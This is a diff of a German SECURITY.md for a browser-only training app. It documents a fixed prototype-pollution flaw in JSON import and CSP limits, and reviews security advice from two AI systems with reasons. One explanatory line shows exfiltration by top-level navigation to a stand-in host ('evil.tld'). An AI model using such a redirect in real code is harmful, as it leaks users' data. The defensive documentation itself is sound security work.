@@ -1,6 +1,6 @@
 # TRAIN — SECURITY.md
 
-Stand: train-v176 (2026-07-18). Zwei Teile: (1) was für TRAINs heutige
+Stand: train-v180 (2026-07-18). Zwei Teile: (1) was für TRAINs heutige
 Architektur bereits gilt, (2) eine Blaupause für den Moment, in dem TRAIN
 einen Server bekommt (Paywall/Coaching-Feature, siehe CLAUDE.md).
 
@@ -35,6 +35,9 @@ keinen Server, gegen den diese Angriffsklassen überhaupt greifen könnten.
    (backup.js) normalisiert Textfelder auf String-Typ + Längen-Deckel als
    Defense-in-Depth — ersetzt nicht das Escaping in ui.js, ergänzt es.
    Neue importierbare Freitextfelder müssen dort mit aufgenommen werden.
+   Seit train-v180 zusätzlich `_stripPrototypePollutionKeys()`, läuft als
+   allererstes über die geparste Datei (vor jeder anderen Prüfung) — siehe
+   Punkt 5 unten.
 3. **CSP-`<meta>`-Tag** (`index.html`) als zusätzliche Absicherung gegen
    externe Script-Injektion. Nur per `<meta>` möglich (GitHub Pages erlaubt
    keine echten HTTP-Header) — deckt daher nicht alles ab (z.B.
@@ -43,10 +46,33 @@ keinen Server, gegen den diese Angriffsklassen überhaupt greifen könnten.
    Bootstrap-`<script>` + 4 inline-`onclick`-Handler (kein Nonce/Hash ohne
    Build-Step möglich). Bei einer künftigen Build-Pipeline: diese 4 Handler
    auf das bestehende `data-action`-Event-Delegation-Muster umstellen und
-   `'unsafe-inline'` aus `script-src` entfernen.
+   `'unsafe-inline'` aus `script-src` entfernen. `connect-src`/`img-src`
+   sind auf `'self'`+GoatCounter begrenzt — blockiert `fetch()`/`Image()`-
+   basierte Datenexfiltration bei einer künftigen XSS-Lücke, **aber nicht**
+   Exfiltration per Top-Level-Navigation (`location.href = 'https://evil.tld/?d=...'`)
+   — dafür gibt es keinen sauberen CSP-Fix (`navigate-to` hat kaum
+   Browser-Support). Unterstreicht, warum das Escaping selbst (Punkt 1) und
+   nicht die CSP die eigentliche Verteidigungslinie ist.
 4. **Rechtliches:** Impressum/Datenschutzerklärung sind ein aktiver
-   Launch-Blocker, siehe BUGS.md B55/B56 — unabhängig vom technischen Teil
-   dieses Dokuments, braucht echte Angaben vom Nutzer.
+   Launch-Blocker, siehe LEGAL.md — unabhängig vom technischen Teil dieses
+   Dokuments, braucht echte Angaben vom Nutzer.
+5. **Prototype Pollution beim JSON-Import (train-v180, Runde-2-Fund).**
+   `state.js`s `STATE_IMPORT`-Reducer merged importierte Daten per
+   `Object.assign(state, imported)`. Code-verifiziert (nicht nur behauptet):
+   ein Top-Level-Feld `"__proto__"` in der importierten JSON ändert darüber
+   tatsächlich `state`s Prototype-Chain (`Object.assign` nutzt intern
+   `[[Set]]`, das den geerbten `__proto__`-Setter auslöst — `JSON.parse`
+   selbst ist davon nicht betroffen, das Risiko entsteht erst beim Merge).
+   Kein globales `Object.prototype`-Pollution (das würde alle Objekte
+   app-weit betreffen), aber `state` selbst bekäme eine vom Angreifer
+   kontrollierte Prototype-Chain — z.B. würde eine `for...in`-Schleife über
+   `state` (falls je eingeführt) plötzlich Angreifer-Properties mitzählen.
+   Fix: `_stripPrototypePollutionKeys()` (backup.js) entfernt `__proto__`/
+   `constructor`/`prototype` rekursiv aus der geparsten Datei, bevor
+   irgendetwas anderes sie anfasst. Verifiziert per direktem Test des
+   exakten Merge-Musters (`Object.assign` auf ein leeres Ziel-Objekt,
+   davor/danach verglichen) — ohne Guard ändert sich die Prototype-Chain
+   nachweislich, mit Guard nicht; legitime Importe bleiben byte-identisch.
 
 ---
 
@@ -82,3 +108,66 @@ jetzt, damit es beim Bau nicht neu recherchiert werden muss.
 
 Kein Umsetzungsplan für heute — aktivieren, wenn die Server-Architektur
 ansteht.
+
+---
+
+## Kritische Prüfung von Runde 2 (Claude Cowork + Gemini, 2026-07-18, train-v180)
+
+Zwei weitere KIs haben das fertige Security-Exportdokument gegengelesen.
+Jeder Punkt wurde eigenständig verifiziert, nicht übernommen:
+
+**Übernommen:** Prototype Pollution beim JSON-Import (Claude Cowork) —
+code-verifiziert am echten `Object.assign(state, imported)`-Muster, siehe
+Punkt 5 oben. Echte, präzise lokalisierte Lücke, gefixt.
+
+**Abgelehnt mit technischer Begründung (nicht nur Meinung):**
+- **SRI-Hash für das GoatCounter-Script** (Claude Cowork, "kostet nichts,
+  Minuten erledigt") — **Einspruch.** GoatCounter liefert `count.js` von
+  einer unversionierten URL (`gc.zgo.at/count.js`), der Skriptinhalt kann
+  sich beim Anbieter jederzeit ändern. Ein SRI-Hash gegen eine
+  unversionierte URL bricht die Analytics beim nächsten Anbieter-Update
+  lautlos (Browser verweigert Ausführung bei Hash-Mismatch) — das ist ein
+  Wartungs-Trade-off, kein Nulltarif-Fix. Nicht umgesetzt; nur sinnvoll,
+  falls GoatCounter eine gepinnte/versionierte Embed-URL anbietet (nicht
+  recherchiert).
+- **"Zirkuläre JSON-Struktur als Client-DoS"** (Gemini) — **faktisch
+  falsch.** JSON-Syntax kennt keine Referenzen; `JSON.parse` kann
+  grundsätzlich keine zirkuläre Objektstruktur erzeugen, unabhängig vom
+  Payload-Inhalt. Die begleitende "5-MB-Payload verlangsamt das
+  Parsen"-Sorge ist real, aber stark übertrieben (Millisekunden-Bereich,
+  kein Crash) und durch den bereits bestehenden Dateigrößen-Cap (B59)
+  ohnehin entschärft.
+- **Client-seitige Verschlüsselung des localStorage** (Gemini, als
+  Top-Priorität vorgeschlagen) — **abgelehnt, Security-Theater für dieses
+  Bedrohungsmodell.** Ein Schlüssel, der ohne Passphrase im selben
+  Browser-Storage/Web-Crypto-Keystore desselben Origins liegt, schützt
+  NICHT gegen genau das Szenario, das Gemini selbst als Begründung nennt
+  (ein XSS-Angreifer hat denselben Zugriff auf den Schlüssel wie die App
+  selbst — kann also identisch entschlüsseln). Zusätzlich neues, größeres
+  Risiko eingekauft: Schlüsselverlust = stiller, kompletter Datenverlust,
+  ein schlimmeres Fehlerbild als das heutige "Cache-Löschung löscht
+  Daten"-Risiko (das ist wenigstens sichtbar/erklärt, siehe
+  Datenschutzerklärung).
+- **"Silent automated backup in die native Datei-App bei jedem Klick"**
+  (Gemini) — **technisch nicht umsetzbar wie beschrieben**, insbesondere
+  nicht auf iOS Safari (TRAINs Hauptzielplattform laut CLAUDE.md).
+  Browser verweigern lautlose Dateischreibvorgänge ohne Nutzer-Geste
+  gezielt (Drive-by-Download-Schutz); die File System Access API, die das
+  am ehesten könnte, existiert auf Safari/iOS gar nicht. Der reale, bereits
+  vorhandene Baustein dagegen: ein Backup-Erinnerungs-Zähler existiert
+  laut Sprint-Historie bereits (4-Wochen-Reminder) — was tatsächlich noch
+  fehlt, ist ein Hinweis schon im Onboarding selbst statt nur in den
+  Einstellungen (siehe CLAUDE.md-Feature-Backlog).
+
+**Ergänzt (kein Widerspruch, aber Präzisierung):** die Feststellung "kein
+Server = IDOR nicht anwendbar" (aus Teil 1 oben) bleibt korrekt für IDOR
+spezifisch (per Definition serverseitiges Konzept), wurde aber von Gemini
+so gelesen, als würde damit auch XSS-getriebene Datenexfiltration
+verneint — das war nie die Aussage (XSS ist explizit als Hauptrisiko in
+Punkt 1 benannt). Trotzdem als Anlass genutzt, die CSP-Grenzen präziser
+zu dokumentieren (Punkt 3 oben, Top-Level-Navigation als Rest-Lücke).
+
+**GitHub-Account-Härtung (beide KIs, unabhängig bestätigt):** WebAuthn/
+Hardware-Key statt SMS/TOTP für 2FA, sicher verwahrte Recovery-Codes.
+Reine Account-Einstellung, kein Code — Nutzer-Aktionspunkt, nicht von
+Claude Code umsetzbar.
